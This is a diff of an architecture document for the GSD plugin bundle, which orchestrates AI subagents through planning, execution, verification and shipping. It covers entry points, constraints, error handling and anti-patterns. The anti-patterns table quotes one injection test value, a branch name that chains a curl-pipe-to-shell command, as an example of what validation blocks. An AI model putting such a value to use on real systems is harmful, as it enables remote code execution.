+| **Fresh-context subagent role** | One-shot clean-context worker | `RESEARCHER_PROMPT`, `PLANNER_PROMPT`, `PLAN_CHECKER_PROMPT`, `EXECUTOR_PROMPT`, `VERIFIER_PROMPT`, `UI_RESEARCHER_PROMPT`, `UI_CHECKER_PROMPT`, `CODEBASE_MAPPER_PROMPT` (`lib/_agents.js`) | Meta-prompt string consts. The orchestrator prepends a `<planning_context>` block before spawning. Roles own their artefact writes; the orchestrator only collects confirmations. |
+| **`.planning/` artefact** | Durable, schema-faithful record | `STATE.md`, `<NN>-CONTEXT.md`, `<NN>-<PP>-PLAN.md`, `<NN>-VERIFICATION.md` | YAML frontmatter (machine) + Markdown body (human). Parsed by the subset parser in `_shared.js`, tolerant of both fenced (`---`) and fenceless frontmatter. |
+| **Slash-command router** | opengsd UX entry point | `/gsd-plan-phase 1`, `/gsd-ship 2 --draft` (`lib/commands.js` `COMMANDS`) | `build(rawInput)` → `{ text, ack }` or `{ err }`. `send(agent, text)` injects a `createUserMessage` followup; returns a short ack. The agent (already a GSD driver) then runs the matching tool. |
+| **Decision predicate** | Pure safety/branching guard | `matchesGapClosure`, `isValidRef`, `isClosedPhase` (`lib/_shared.js:278-295`) | Pure functions, unit-tested in `test/_shared.test.mjs`. Guards: `--gaps-only` filtering, base-branch shell-injection prevention, replan gate. |
 
 ## Entry Points
 
-| Entry point | Location | Triggers | Responsibilities |
+| Entry point | Location | Trigger | Responsibility |
 |---|---|---|---|
-| Persona + context | `lib/persona.js` | every session start (system prompt assembly) | frame the agent, orient at STATE.md |
-| `gsd_init` | `lib/core-tools.js:16` | first-run user request / `/gsd-init` | bootstrap `.planning/` |
-| `gsd_status` | `lib/core-tools.js:83` | orientation request / `/gsd-status` | print loop position |
-| `gsd_discuss` | `lib/discuss.js:17` | discuss step / `/gsd-discuss-phase <N>` | seal CONTEXT.md |
-| `gsd_ui_phase` | `lib/ui.js:16` | optional UI step / `/gsd-ui-phase <N>` | produce UI-SPEC.md |
-| `gsd_plan` | `lib/plan.js:20` | plan step / `/gsd-plan-phase <N>` | RESEARCH + PLAN files + checker |
-| `gsd_execute` | `lib/execute.js:25` | execute step / `/gsd-execute-phase <N>` | wave executors + SUMMARY.md |
-| `gsd_verify` | `lib/verify.js:21` | verify step / `/gsd-verify-work <N>` | VERIFICATION.md + routing |
-| `gsd_ship` | `lib/ship.js:32` | ship step / `/gsd-ship [N] [--draft]` | preflight, PR creation, STATE update |
-| `gsd_quick` | `lib/quick.js:26` | quick task / `/gsd-quick <task>` | single subagent, record under `.planning/quick/` |
-| Slash commands | `lib/commands.js:159-175` | `/gsd-` user input | route to the matching tool via followup message |
+| **Package main / `@dsh-gsd/bundle`** | `lib/persona.js` (`package.json` `main` + `exports["."]`) | Host Cordis loader resolves the plugin row `name: '@dsh-gsd/bundle/persona'` | Install the persona + runtime context. |
+| **`@dsh-gsd/bundle/state`** | `lib/state.js` | Plugin row `gsd-state` | Publish `gsdState`. |
+| **`@dsh-gsd/bundle/<phase>`** | `lib/{core-tools,discuss,plan,execute,verify,ship,ui,quick,map-codebase,commands}.js` | The matching `cordis.patch.yml` insert row | Register the phase tool(s) / commands. |
+| **`cordis.patch.yml`** | repo root | `dsh plugin add` applies it after `dsh-base` | Override `agent-loop.config` to configure the `gsd` agent; insert the GSD plugin rows. Last-write-wins per row. |
+| **`gsd_init` tool** | `lib/core-tools.js:16-80` | Model tool call (or `/gsd-init`) | Bootstrap a project: write `.planning/PROJECT.md`, `REQUIREMENTS.md`, `ROADMAP.md`, `STATE.md`, `config.json`. |
+| **`gsd_status` tool** | `lib/core-tools.js:83-118` | Model tool call (or `/gsd-status`) | Read STATE.md + ROADMAP.md, render the loop position. |
+| **`/gsd-*` commands** | `lib/commands.js:174-189` | User types a slash command in chat | Inject a user-message followup instructing the agent to run the matching tool; return an ack. |
 
 ## Architectural Constraints
 
-- **Threading:** Single Node process; no worker threads. All orchestration is async/await; parallel executor dispatch uses `Promise.all` within a wave (`lib/execute.js:102`). `ship.js` calls `git`/`gh` via blocking `execSync` (`lib/ship.js:20-27`).
-- **Sync persona context:** The runtime-context provider is synchronous (`persona.js:81-88`), so it reads only the in-memory `gsdState._cache`; the cache is populated on every artefact write and refreshed by `readState` (`lib/state.js:191-198`).
-- **Fresh-context subagents only:** research, planning, execution, verification must run in `spawn`-provider subagents; the orchestrators must never write plans/code themselves.
-- **No cross-plugin imports:** phase modules import only `lib/_shared.js`, `lib/_runner.js`, `lib/_agents.js` + host packages; the only dependency between plugins is the `gsdState` service obtained via `ctx.get`.
-- **Consumed-but-not-injected host services:** `subagents` is fetched via `ctx.get` inside `execute` bodies (not listed in `inject`) in `plan.js`, `execute.js`, `verify.js`, `ui.js`, `quick.js`; `persona.js` reads `ctx.get('gsdState')` inside the context provider for late activation.
-- **Shared working tree:** executors run on the shared working tree, not per-plan git worktrees (deliberate simplification documented in `lib/execute.js:9-12`); same-wave non-overlap is guaranteed by the plan-checker.
-
-## Error Handling
-
-**Strategy:** Guard-clause validation per tool. Every tool starts by verifying: `gsdState` available → project initialised → phase exists in ROADMAP → prerequisite artefact exists (`CONTEXT` for plan, `PLAN`s for execute/verify, `VERIFICATION passed` for ship). Failures throw descriptive `Error`s or return instruction strings that tell the user the next step.
-
-**Patterns:**
-- `throw new Error("gsd_plan: …")` for hard prerequisites
-- Best-effort fallbacks: `catch(() => "")` on artefact reads (`lib/plan.js:89-90`, `lib/execute.js:47-48`), `gitOk`/`gh` wrappers that return `""` on failure (`lib/ship.js:21-27`)
-- Status-routing strings (not exceptions) for workflow outcomes: `passed` / `gaps_found` / `human_needed` (`lib/verify.js:87-98`), `## PLANNING COMPLETE` / `## PHASE SPLIT RECOMMENDED` etc. as marker strings from subagent output (`lib/plan.js:110-112`)
-- Subagent failure detection: short-output check (`< 50 chars`) and `stopReason`/`diagnostic` surfaced (`lib/plan.js:80-82`, `lib/ui.js:50`)
-
-## Cross-Cutting Concerns
-
-**Logging:** No logging framework; human-readable progress is accumulated into a `log` array per tool and returned as the tool's text output (`lib/plan.js:63`, `lib/execute.js:60-120`, `lib/ship.js:49-139`). Subagent outputs are truncated to ~120-500 chars when embedded in logs.
-**Validation:** input validation lives in tool `parameters` schemas (`defineTool`) + the state service's parse/stringify round-trip; no runtime validation library beyond schemastery's.
-**Authentication:** none in the bundle itself — `gsd_ship` relies on the local `gh` CLI being installed/authenticated (`lib/ship.js:71-72`).
-**Path discipline:** every FS access goes through `gsdState` `ctx.fs.resolve`/`processPath` wrappers or the host fs service; `cwd` is resolved from the session header with `process.cwd()` fallback.
+- **No runtime dependencies.** `package.json` declares `"dependencies": {}`.
+  All host interaction is through peer dependencies (`@deepseek-ai/dsh-tools`,
+  `@deepseek-ai/schemastery`, `@deepseek-ai/cordis`, `@deepseek-ai/dsh-llm`)
+  and Node built-ins (`node:child_process`, `node:fs/promises`). The bundle is
+  shippable as-is; the host provides the runtime.
+- **Plugin contract is fixed.** Every plugin module MUST `export { name,
+  inject, apply }` with `name` matching the `cordis.patch.yml` row id and
+  `inject` listing every host service `apply` uses. Adding a new plugin means
+  adding a row in `cordis.patch.yml` and a subpath export in `package.json`.
+- **`gsdState` is the only cross-plugin shared service.** Phase tools MUST NOT
+  reach for host services directly except through their declared `inject`.
+  The closure idiom `const gsd = () => ctx.get("gsdState")` defers resolution
+  to call time (the service is registered by `gsd-state`, which activates in
+  its own row; `inject` only guarantees availability before `apply` runs, not
+  before a tool's later `execute`).
+- **`subagents` is required for plan/execute/verify/ui/quick/map-codebase.**
+  `spawnSubagent` throws a clear error if the `spawn` provider is missing
+  (`lib/_runner.js:10-12`). `gsd_discuss` and `gsd_core-tools` do NOT need it —
+  they are pure artefact IO.
+- **Shared working tree, not per-plan worktrees.** Executors run on the
+  current branch (`lib/execute.js` comment, lines 9-12). The plan-checker's
+  same-wave non-overlap guarantee (Dimension 3 in `PLAN_CHECKER_PROMPT`) is
+  what makes the shared tree safe. Per-plan git worktrees are deliberately
+  omitted (a harness-worktree feature), per `README.md` § Faithfulness.
+- **No global mutable state across cwd.** `GsdState._cache` is keyed by `cwd`
+  and cleared on teardown. Tools resolve `cwd` from `exec.agent.session.header.cwd`
+  (`cwdOf`, `lib/_runner.js:48`) with a `process.cwd()` fallback — never from
+  a module-level constant.
+- **Shell calls are validated-ref only.** `gsd_ship` and `gsd_map_codebase`
+  pass branch/path values into `execFileSync` only after `isValidRef`
+  (`lib/_shared.js:286`) / `validatePaths` (`lib/map-codebase.js:47`) guards
+  — preventing command injection (`test/_shared.test.mjs` pins this).
+- **No circular imports.** Dependency graph is acyclic and downward:
+  `persona` → `state`/`_shared`; phase tools → `state`/`_runner`/`_agents`/
+  `_shared`; `_runner` → `_shared`; `_agents` → none; `_shared` → none.
 
 ## Anti-Patterns
 
-### Private-method reach-in from sibling plugin
+| What | Why wrong | Do this instead |
+|---|---|---|
+| Importing a phase tool from another phase tool | Couples loop steps; breaks the orchestrator-only-downward rule | Share logic via `lib/_shared.js` (pure) or `lib/_runner.js` (orchestration). Add a new exported helper there if needed. |
+| Reaching for `ctx.fs` / `ctx.subagents` from a plugin that did not declare them in `inject` | Violates the plugin contract; the service may not be wired | Declare the service in `inject` (e.g. `const inject = ["gsdState", "tools"]`). |
+| Calling `ctx.get("gsdState")` at `apply` time and storing the reference | `gsd-state` may not have activated yet; a stored reference can go stale across plugin lifecycles | Use the closure `const gsd = () => ctx.get("gsdState")` and resolve at `execute` time (the pattern every phase tool uses). |
+| Parsing PLAN/SUMMARY/VERIFICATION frontmatter with a general YAML library | Subagents sometimes omit the `---` fences; a strict parser returns `{}` and silently drops requirements/wave/status — the bugs pinned in `test/_shared.test.mjs` and `test/state.test.mjs` | Use `parseFrontmatter` from `lib/_shared.js`, which handles both fenced and fenceless frontmatter + one level of nesting. |
+| Comparing `gap_closure === "true"` | `coerceScalar` parses unquoted `gap_closure: true` as a boolean, so the string compare never matches and `--gaps-only` runs nothing (pinned bug) | Use `matchesGapClosure(value)` (`lib/_shared.js:278`), which accepts `true`, `"true"`, `"True"`. |
+| Interpolating user/model branch names into git/gh CLI strings | Command injection (`test/_shared.test.mjs` pins `main; curl evil.sh\|sh`) | Validate with `isValidRef` (`lib/_shared.js:286`) before passing to `execFileSync`. Use `execFileSync` (argv form), never `execSync` with a shell string. |
+| Letting `total_plans` / `completed_plans` / `percent` drift from the roadmap | Status reports "X/0 plans" or wrong percentages (pinned bugs) | Always recompute via `recomputeProgress` / `completePhase`, which read the roadmap as the single source of truth. |
+| Running the full test suite from the orchestrator between waves | The orchestrator stays lean; the per-task `<verify>` is the gate | Leave regression to each executor's own `<verify>` (the `gsd_execute` post-wave comment at `lib/execute.js:119-121` documents this deliberately). |
+| A subagent committing VERIFICATION.md | The orchestrator bundles phase artefacts; a verifier committing can race the ship preflight's clean-tree gate | The `VERIFIER_PROMPT` explicitly says "DO NOT commit VERIFICATION.md — the orchestrator bundles it" (`lib/_agents.js`). |
 
-**What happens:** `lib/quick.js:40` calls `s._planning(cwd)` — a method named `_private` on `GsdState` (`lib/state.js:41`) — and `lib/quick.js:58` tests `if (s.isProject)` (truthiness of the method, not the project's existence).
-**Why it's wrong:** the underscore contract is violated; the truthiness test silently skips the decision recording whenever a project exists (the method is always defined). Breakage is a latent no-op rather than an error.
-**Do this instead:** expose the quick-dir layout as a public helper on `GsdState` (e.g. `quickDir(cwd, slug)`) and call `await s.isProject(cwd)` for the guard.
+## Error Handling
 
-### Parallel sync/async FS mixing
+**Strategy: fail loud, fail early, with a recoverable message.** The bundle
+prefers throwing a precise `Error` over silently returning empty, because the
+GSD loop's guards (discuss-before-plan, plan-before-execute, verify-before-ship)
+depend on the next step seeing a real failure.
 
-**What happens:** some tools resolve `cwd` via `cwdOf(exec)` (`lib/_runner.js:48-50`), others inline `exec?.agent?.session?.header?.cwd || process.cwd()` (`lib/core-tools.js:53`, `lib/discuss.js:69`).
-**Why it's wrong:** duplicated logic drifts; `cwdOf` centralised for phase tools but the orientation tools and discuss still inline.
-**Do this instead:** use `cwdOf(exec)` everywhere (import from `lib/_runner.js`).
+**Patterns:**
 
-### `_ensureDir` is a no-op
+- **Tool-entry guards throw.** Every tool's `execute` begins with a guard
+  chain: `gsdState` present? project exists? phase in roadmap? subagents
+  present? Each throws a message naming the tool and the missing prerequisite
+  (e.g. `gsd_plan: no .planning/ project — run gsd_init first`,
+  `lib/plan.js:39`). The model reads these and routes to the right prior step.
+- **Closed-phase / status gates throw with the bypass hint.**
+  `gsd_plan` on a passed phase throws
+  `… already passed verification. Re-run with force=true to replan …`
+  (`lib/plan.js:51`). `gsd_ship` preflight `fail(msg)` throws
+  `gsd_ship preflight failed: <msg>` (`lib/ship.js:53`).
+- **`defineTool` validates args before `execute`.** `parameterSchemaSpecToJsonSchema`
+  + `validateJsonSchemaValue` reject bad args as `ToolArgsError`
+  (`node_modules/@deepseek-ai/dsh-tools/lib/index.js:862-865`). The model gets
+  a structured violation, not a runtime crash.
+- **Best-effort IO swallows expected absences.** `s.readArtifact(...).catch(() => "")`
+  is used where an absent artefact is a normal state (e.g. optional RESEARCH.md,
+  UAT.md) — `lib/plan.js:90-91`, `lib/verify.js:44-46`. Absence of a *required*
+  artefact is then caught by an explicit guard (`if (!verText) fail(...)`).
+- **Subagent failure surfaces, not swallowed.** `spawnSubagent` returns
+  `{ output, stopReason, diagnostic }`; callers check for empty/short output
+  and return a message with the `stopReason` (e.g. `lib/plan.js:81`,
+  `lib/ui.js:50`). The map orchestrator reports missing/thin documents
+  explicitly (`lib/map-codebase.js:165-175`).
+- **Pure predicates never throw on bad input.** `isClosedPhase(undefined)`,
+  `isValidRef("")`, `matchesGapClosure(null)` all return `false`
+  (`test/_shared.test.mjs`); they are guards, not parsers.
+- **No try/catch around the happy path.** The bundle does not wrap routine
+  logic in catch-all blocks; failures propagate to the tool runtime, which
+  reports them to the model. The only broad `try/catch` blocks are around
+  optional best-effort IO and the persona context provider (`lib/persona.js:85`
+  returns `""` on any throw so a state-read error never breaks the session).
 
-**What happens:** `lib/state.js:61-66` `_ensureDir` stats the target and swallows the error without creating anything.
-**Why it's wrong:** dead code that reads as if it creates directories; callers may assume directory existence.
-**Do this instead:** implement with `fs.mkdir({recursive: true})` or remove it.
+## Cross-Cutting Concerns
 
-### Inline temporary PR body file
+- **Logging / observability:** Not applicable. The bundle emits no logs; every
+  tool returns a human-readable Markdown string (its tool result) that the
+  model relays. The "log" is the returned string + the `STATE.md` decision
+  lines appended via `s.addDecision` (`lib/state.js:265`). Subagent outputs are
+  truncated to ~120-500 chars in orchestrator returns to keep the session lean
+  (e.g. `lib/execute.js:115`, `lib/verify.js:96`).
+- **Validation:** Three layers. (1) `defineTool` arg validation (schema).
+  (2) Tool-entry guards (project/phase/service presence). (3) Pure predicates
+  for security-sensitive values (`isValidRef`, `validatePaths`,
+  `matchesGapClosure`, `isClosedPhase`). Frontmatter is parsed by the tolerant
+  subset parser, not a strict schema — faithfulness to what subagents actually
+  write matters more than schema purity.
+- **Authentication / secrets:** Not applicable to the bundle itself. `gsd_ship`
+  delegates GitHub auth to the `gh` CLI (`gh auth status` preflight,
+  `lib/ship.js:77`). The codebase mapper's forbidden-secrets rule
+  (`CODEBASE_MAPPER_PROMPT`) prevents secret leakage into committed map docs.
+  No `.env`/credentials are read by any module.
+- **Configuration:** `.planning/config.json` (`lib/state.js:143-161`,
+  `_defaultConfig`) holds workflow flags (`tdd_mode`, `mvp_mode`,
+  `use_worktrees`, `commit_docs`, `context_window`, `project_code`). Read via
+  `s.readConfig`; written once at `gsd_init`. Host-side config is the
+  `cordis.patch.yml` row config (agent-loop override + plugin rows).
+- **Committing:** Executors commit atomically per task (conventional-commit
+  `{phase}-{plan}` scope) inside the subagent. The orchestrator commits the
+  codebase map (`gitAddCommit`, `lib/map-codebase.js:59`) and the ship step
+  pushes the branch. Phase artefact commits are best-effort and never block
+  the loop.
+- **Concurrency:** Same-wave executors run in parallel via `Promise.all`
+  (`lib/execute.js:80-101`). The plan-checker's non-overlap guarantee makes
+  this safe. `maxParallelToolCalls: 10` is set in the agent-loop override
+  (`cordis.patch.yml:26`).
 
-**What happens:** `gsd_ship` writes the PR body to `cwd/.planning/.pr-body-<N>.md` then unlinks it after `gh pr create` (`lib/ship.js:120-130`).
-**Why it's wrong:** a crash between write and unlink leaves a stray dot-file in the user's `.planning/`; the file is also created before the push, so it could pollute the commit tree if the tree is dirty (it isn't — preflight asserts clean).
-**Do this instead:** use `os.tmpdir()` or pass the body via stdin with `--body-file -`.
-
-### Redundant plan filter
-
-**What happens:** `lib/execute.js:52` computes `idx.incomplete.filter((p) => !p.has_summary)` — `planIndex` already returns only plans without summaries.
-**Why it's wrong:** redundant predicate; the intent (re-run filtering) is invisible.
-**Do this instead:** filter once, e.g. `plans = idx.incomplete` and keep the `gapsOnly`/`wave` filters.
-
----
-
-*Architecture analysis: 2026-08-22*
+*Architecture analysis: 2026-08-23*
